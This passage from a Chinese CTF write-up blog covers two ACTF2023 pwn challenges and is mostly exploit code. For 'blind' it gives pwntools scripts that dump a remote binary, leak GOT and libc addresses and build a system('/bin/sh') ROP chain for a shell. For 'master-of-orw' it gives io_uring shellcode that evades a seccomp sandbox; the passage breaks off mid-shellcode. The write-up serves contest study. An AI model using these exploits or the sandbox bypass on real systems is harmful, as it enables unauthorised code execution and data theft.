class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(data)==<span class="hljs-built_in">int</span>:<br>            cdata=p64(data)<br>        <span class="hljs-keyword">else</span>:<br>            cdata=data[<span class="hljs-number">1</span>:<span class="hljs-number">2</span>]+data[<span class="hljs-number">3</span>:]<br>        <span class="hljs-built_in">print</span>(cdata)<br>    <span class="hljs-comment">#    p.interactive()</span><br>        <span class="hljs-built_in">print</span>(cdata,cache,ind)<br>        <span class="hljs-keyword">if</span> n==<span class="hljs-number">0</span>:<br>            cache=cdata<br>        <span class="hljs-keyword">elif</span> cdata==cache:<br>                <span class="hljs-keyword">return</span> cdata<br>        <span class="hljs-keyword">else</span>:<br>            cache=cdata<br>        n+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> n&gt;=<span class="hljs-number">10</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span><br>        time.sleep(<span class="hljs-number">0.05</span>)<br><br><br>fdata=<span class="hljs-string">b&#x27;&#x27;</span><br>ind=<span class="hljs-number">8</span><br><span class="hljs-keyword">try</span>:<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    data=check(ind)<br>    fdata+=data<br>    f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;elf1&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>    f.write(fdata)<br>    f.close()<br>    ind+=<span class="hljs-number">8</span><br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br>ind=<span class="hljs-number">0</span><br>fdata=<span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">try</span>:<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    data=check(ind)<br>    fdata=data+fdata<br>    f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;elf2&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>    f.write(fdata)<br>    f.close()<br>    ind-=<span class="hljs-number">8</span><br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br><br></code></pre></td></tr></table></figure><p>在获取程序内容时会有些乱七八糟的数据,导致<code>ida</code>解析失败,所以需要手动解析<code>.rela,.sym,.str</code>表的信息,获取库函数对应<code>got</code>表地址,然后再泄露got表数据,获取目标靶机<code>libc</code>版本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">泄露got表信息</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>debug=<span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">p,data</span>):<br>    p.sendline(data)<br>    d=p.readuntil(<span class="hljs-string">b&#x27;\n&gt;&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">2</span>]<br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i:02x&#125;</span> &quot;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;: %s&quot;</span>%d)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(d))<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> u64(d)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> d<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">ind</span>):<br>    cache=<span class="hljs-string">&quot;&quot;</span><br>    n=<span class="hljs-number">0</span><br>    p=remote(<span class="hljs-string">&quot;120.46.65.156&quot;</span>,<span class="hljs-string">&quot;32104&quot;</span>)<br>    p.readuntil(<span class="hljs-string">b&quot;submit.&quot;</span>)<br>    p.readuntil(<span class="hljs-string">b&#x27;&gt;&#x27;</span>)<br>    stack=send(p,<span class="hljs-string">b&quot;8d8w&quot;</span>)<br>    elf=send(p,<span class="hljs-string">b&quot;8a8w8a&quot;</span>)-<span class="hljs-number">0x1580</span>+ind<br>    success(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;elf=:x&#125;</span>   <span class="hljs-subst">&#123;stack=:x&#125;</span>&quot;</span>)<br>    stack=stack+<span class="hljs-number">8</span><br>    code=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        sc=(stack&gt;&gt;(i*<span class="hljs-number">8</span>))&amp;<span class="hljs-number">0xff</span><br>        ec=(elf&gt;&gt;(i*<span class="hljs-number">8</span>))&amp;<span class="hljs-number">0xff</span><br>        <span class="hljs-keyword">if</span> sc&gt;ec:<br>            code+=<span class="hljs-string">&quot;%ss1d&quot;</span>%(sc-ec)<br>        <span class="hljs-keyword">elif</span> sc&lt;ec:<br>            code+=<span class="hljs-string">&quot;%sw1d&quot;</span>%(ec-sc)<br>        <span class="hljs-keyword">else</span>:<br>            code+=<span class="hljs-string">&#x27;1d&#x27;</span><br>    data=send(p,code.encode())<br>    p.close()<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(data)==<span class="hljs-built_in">int</span>:<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">hex</span>(data))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">hex</span>(u64(data[<span class="hljs-number">1</span>:<span class="hljs-number">2</span>]+data[<span class="hljs-number">3</span>:])))<br><span class="hljs-keyword">import</span> os<br><br>gots=&#123;<span class="hljs-string">&quot;free&quot;</span>:<span class="hljs-number">0x4018</span>,<br><span class="hljs-string">&quot;putchar&quot;</span>:<span class="hljs-number">0x4020</span>,<br><span class="hljs-string">&quot;toupper&quot;</span>:<span class="hljs-number">0x4028</span>,<br><span class="hljs-string">&quot;puts&quot;</span>:<span class="hljs-number">0x4030</span>,<br><span class="hljs-string">&quot;setbuf&quot;</span>:<span class="hljs-number">0x4038</span>,<br><span class="hljs-string">&quot;printf&quot;</span>:<span class="hljs-number">0x4040</span>,<br><span class="hljs-string">&quot;memset&quot;</span>:<span class="hljs-number">0x4048</span>,<br><span class="hljs-string">&quot;getline&quot;</span>:<span class="hljs-number">0x4050</span>,<br><span class="hljs-string">&quot;exit&quot;</span>:<span class="hljs-number">0x4058</span>,<br><span class="hljs-string">&quot;libc_start_main&quot;</span>:<span class="hljs-number">0x3fe0</span>&#125;<br>syms=&#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> gots:<br>    syms[i]=check(gots[i])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> gots:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%s: %s&quot;</span>%(i,syms[i]))<br><br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/ACTF2023/blind.png" srcset="/img/loading.gif" lazyload alt="got表信息" title="got表信息"></p><p><img src="/img/blog_img/ACTF2023/blind-1.png" srcset="/img/loading.gif" lazyload alt="libc版本" title="libc版本"></p><h3 id="exp">exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">攻击脚本</span><br><span class="hljs-string">exp中使用的libc版本为 Debian GLIBC 2.31-13+deb11u2</span><br><span class="hljs-string"></span><br><span class="hljs-string">脚本执行之后需要手动回车才能获取shell</span><br><span class="hljs-string">并且pwntools不能用4.11.0,否则直接回车会导致交互断开</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>debug=<span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">data</span>):<br>    p.sendline(data)<br>    d=p.readuntil(<span class="hljs-string">b&#x27;\n&gt;&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">2</span>]<br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i:02x&#125;</span> &quot;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;: %s&quot;</span>%d)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(d))<br>    <span class="hljs-keyword">return</span> d<br><br>p=remote(<span class="hljs-string">&quot;120.46.65.156&quot;</span>,<span class="hljs-string">&quot;32104&quot;</span>)<br>p.readuntil(<span class="hljs-string">b&quot;submit.&quot;</span>)<br>p.readuntil(<span class="hljs-string">b&#x27;&gt;&#x27;</span>)<br><br>stack=u64(send(<span class="hljs-string">&quot;8d8w&quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br>send(<span class="hljs-string">&quot;8a8s&quot;</span>)<br>pause()<br>libc=ELF(<span class="hljs-string">&quot;./libc1&quot;</span>)<br>libc_main=(u64(send(<span class="hljs-string">&quot;8d24w&quot;</span>)))<br>libc.address=libc_main-<span class="hljs-number">0x23d0a</span>-<span class="hljs-number">0x41660</span>+<span class="hljs-number">0x3e660</span><br>ret=<span class="hljs-number">0x000000000002535f</span>+libc.address<br>rdi=<span class="hljs-number">0x0000000000026796</span>+libc.address<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>puts=libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>bin_sh=stack+<span class="hljs-number">8</span>+<span class="hljs-number">8</span>+<span class="hljs-number">8</span>*<span class="hljs-number">3</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bin_sh))<br><br>payload=p64(rdi)+p64(bin_sh)+p64(system)+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br><span class="hljs-built_in">print</span>(payload)<br><br><span class="hljs-comment">#gadget=libc.sym[&#x27;&#x27;]</span><br>ind=<span class="hljs-number">0</span><br>srcdata=p64(libc_main)<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(srcdata)&lt;<span class="hljs-built_in">len</span>(payload):<br>    <span class="hljs-keyword">if</span> ind==<span class="hljs-number">0</span>:<br>        srcdata+=send(<span class="hljs-string">&quot;24a8w&quot;</span>)<br>        ind+=<span class="hljs-number">8</span><br>    <span class="hljs-keyword">else</span>:<br>        srcdata+=send(<span class="hljs-string">&quot;8a8w&quot;</span>)<br>        ind+=<span class="hljs-number">8</span><br><span class="hljs-keyword">if</span> ind!=<span class="hljs-number">0</span>:<br>    send(<span class="hljs-string">f&quot;8a<span class="hljs-subst">&#123;ind&#125;</span>s&quot;</span>)<br>    <span class="hljs-built_in">print</span>(ind)<br>    ind+=<span class="hljs-number">16</span><br>    send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ind&#125;</span>d&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    send(<span class="hljs-string">&quot;8a&quot;</span>)<br><span class="hljs-built_in">print</span>(payload)<br><span class="hljs-built_in">print</span>(srcdata)<br>code=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i,ec <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(payload):<br>    sc=srcdata[i]<br>    <span class="hljs-keyword">if</span> sc&gt;ec:<br>        code+=<span class="hljs-string">&quot;%ss1d&quot;</span>%(sc-ec)<br>    <span class="hljs-keyword">elif</span> sc&lt;ec:<br>        code+=<span class="hljs-string">&quot;%sw1d&quot;</span>%(ec-sc)<br>    <span class="hljs-keyword">else</span>:<br>        code+=<span class="hljs-string">&#x27;1d&#x27;</span><br><span class="hljs-built_in">print</span>(code)<br>send(code)<br>p.interactive()<br>p.close()<br><br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/ACTF2023/blind-2.png" srcset="/img/loading.gif" lazyload alt="执行效果" title="执行效果"></p><h2 id="master-of-orw">master-of-orw</h2><p>程序开启了seccomp沙盒,禁用了多数常用的io系统调用<br><img src="/img/blog_img/ACTF2023/master-of-orw.png" srcset="/img/loading.gif" lazyload alt="沙盒信息" title="沙盒信息"></p><p>沙盒禁用的系统调用:</p><ul><li>读取数据: <code>read</code>,<code>readv</code>,<code>preadv</code>,<code>preadv2</code></li><li>写入数据: <code>write</code>,<code>writev</code>,<code>pwritev</code>,<code>pwritev2</code></li><li>打开文件: <code>open</code>,<code>openat</code>,<code>name_to_handle_at</code>,<code>open_by_handle_at</code>,<code>open_tree</code>,<code>openat2</code></li><li>执行命令: <code>execve</code>,<code>execveat</code></li></ul><p>通常在这种沙盒的保护下,是无法泄露flag文件的内容的,不过在新版的linux中引用了新的io框架 <code>io_uring</code>,是一种高性能异步I/O框架</p><p>而<code>io_uring</code>可以通过<code>io_uring_setup</code>,<code>io_uring_enter</code>两个系统调用来实现打开文件,读取文件,写入文件的操作</p><h3 id="exp-2">exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp</span><br><span class="hljs-string">如果觉得汇编不好写,可以先用c写一个模板,然后复制编译好的汇编指令</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rbp,rsp</span><br><span class="hljs-string">sub rsp,0x400</span><br><span class="hljs-string">mov eax,0</span><br><span class="hljs-string">mov ecx,0x80</span><br><span class="hljs-string">mov rdi,rsp</span><br><span class="hljs-string">rep stosq</span><br><span class="hljs-string">mov rdi,16</span><br><span class="hljs-string">lea rsi,[rbp-0x3f8]</span><br><span class="hljs-string">mov eax,425</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov [rbp-0x400],rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*  io_uring_mmap */</span><br><span class="hljs-string">lea rdi,[rbp-0x380]</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">mov [rdi],rax</span><br><span class="hljs-string">mov [rdi+208],rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov eax,dword ptr [rbp-0x3f8+4*16]</span><br><span class="hljs-string">mov ebx,dword ptr [rbp-0x3f8]</span><br><span class="hljs-string">lea rax,[eax+ebx*4]</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov ebx,dword ptr  [rbp-0x3f8+4*25]</span><br><span class="hljs-string">mov esi,dword ptr  [rbp-0x3f8+4]</span><br><span class="hljs-string">shl rsi,4</span><br><span class="hljs-string">lea rcx,[rsi+rbx]</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov [rbp-0x380+8*9],rax</span><br><span class="hljs-string">mov [rbp-0x380+104+8*7],rcx</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov ebx,dword ptr [rbp-0x3f8+5*4]</span><br><span class="hljs-string">and ebx,1</span><br><span class="hljs-string">test ebx,ebx</span><br><span class="hljs-string">jz label1_1</span><br><span class="hljs-string"></span><br><span class="hljs-string">cmp rax,rcx</span><br><span class="hljs-string">jge label1_2</span><br><span class="hljs-string">mov rax,rcx</span><br><span class="hljs-string">label1_2:</span><br><span class="hljs-string">mov [rbp-0x380+8*9],rax</span><br><span class="hljs-string">mov [rbp-0x380+104+8*7],rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">label1_1:</span><br><span class="hljs-string">mov rsi,rax</span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">mov rdx,3</span><br><span class="hljs-string">mov rcx,32769</span><br><span class="hljs-string">mov r8,[rbp-0x400]</span><br><span class="hljs-string">xor r9,r9</span><br><span class="hljs-string">mov rax,9</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov [rbp-0x380+8*10],rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rcx,7</span><br><span class="hljs-string">label1:</span><br><span class="hljs-string">mov ebx,dword ptr [rbp-0x3f8+4*9+rcx*4]</span><br><span class="hljs-string">lea rbx,[rbx+rax]</span><br><span class="hljs-string">mov [rbp-0x380-8+rcx*8],rbx</span><br><span class="hljs-string">dec rcx</span><br><span class="hljs-string">test rcx,rcx</span><br><span class="hljs-string">jnz label1</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rsi,[rbp-0x380+104+8*7]</span><br><span class="hljs-string">mov rdi,0</span><br><span class="hljs-string">mov rdx,3</span><br><span class="hljs-string">mov rcx,32769</span><br><span class="hljs-string">mov r8,[rbp-0x400]</span><br><span class="hljs-string">mov r9d,0x8000000</span><br><span class="hljs-string">mov rax,9</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov [rbp-0x380+104+8*8],rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rcx,7</span><br><span class="hljs-string">label2:</span><br><span class="hljs-string">mov ebx,dword ptr  [rbp-0x3f8+4*19+rcx*4]</span><br><span class="hljs-string">lea rbx,[rbx+rax]</span><br><span class="hljs-string">mov [rbp-0x380+104+rcx*8],rbx</span><br><span class="hljs-string">dec rcx</span><br><span class="hljs-string">test rcx,rcx</span><br><span class="hljs-string">jnz label2</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov ebx,dword ptr [rbp-0x3f8+4*26]</span><br><span class="hljs-string">test ebx,ebx</span><br><span class="hljs-string">jz label3</span><br><span class="hljs-string">jmp label4</span><br><span class="hljs-string">label3:</span><br><span class="hljs-string">xor rbx,rbx</span><br><span class="hljs-string">mov [rbp-0x380-8+104+4*8],rbx</span><br><span class="hljs-string"></span><br><span class="hljs-string">label4:</span><br><span class="hljs-string">mov esi,dword ptr [rbp-0x3f8]</span><br><span class="hljs-string">shl rsi,6</span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">mov rdx,3</span><br><span class="hljs-string">mov rcx,32769</span><br><span class="hljs-string">mov r8,[rbp-0x400]</span><br><span class="hljs-string">mov r9,0x10000000</span><br><span class="hljs-string">mov rax,9</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov [rbp-0x380+7*8],rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov eax,dword ptr [rbp-0x400]</span><br><span class="hljs-string">mov dword ptr [rbp-0x380+196],eax</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov eax,dword ptr [rbp-0x3f8+4*2]</span><br><span class="hljs-string">mov dword ptr [rbp-0x380+192],eax</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov eax,dword ptr [rbp-0x3f8+4*5]</span><br><span class="hljs-string">mov dword ptr [rbp-0x380+200],eax</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* io_uring_mmap end*/</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*</span><br><span class="hljs-string">mov rdx,[rbp-0x400]</span><br><span class="hljs-string">lea rdi,[rbp-0x380]</span><br><span class="hljs-string">mov [rdi+196],rdx</span><br><span class="hljs-string">*/</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">/* open */</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax,0x67616c66</span><br><span class="hljs-string">mov [rbp-0x60],rax</span><br><span class="hljs-string">lea rdi,[rbp-0x380]</span><br><span class="hljs-string">call io_uring_get_sqe</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov [rbp-0x70],rax</span><br><span class="hljs-string">mov rsi,rax</span><br><span class="hljs-string">mov rdx,-100</span><br><span class="hljs-string">lea rcx,[rbp-0x60]</span><br><span class="hljs-string">xor r8,r8</span><br><span class="hljs-string">xor r9,r9</span><br><span class="hljs-string">mov rdi,18</span><br><span class="hljs-string">call io_uring_prep_rw</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi,[rbp-0x70]</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax,4</span><br><span class="hljs-string">mov [rdi+32],rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">mov dword ptr [rdi+28],eax</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">/* read */</span><br><span class="hljs-string">lea rdi,[rbp-0x380]</span><br><span class="hljs-string">call io_uring_get_sqe</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rsi,rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdx,4</span><br><span class="hljs-string">lea rcx,[rbp-0x60]</span><br><span class="hljs-string">mov r8,0x50</span><br><span class="hljs-string">xor r9,r9</span><br><span class="hljs-string">mov rdi,22</span><br><span class="hljs-string">call io_uring_prep_rw</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">/* write */</span><br><span class="hljs-string">lea 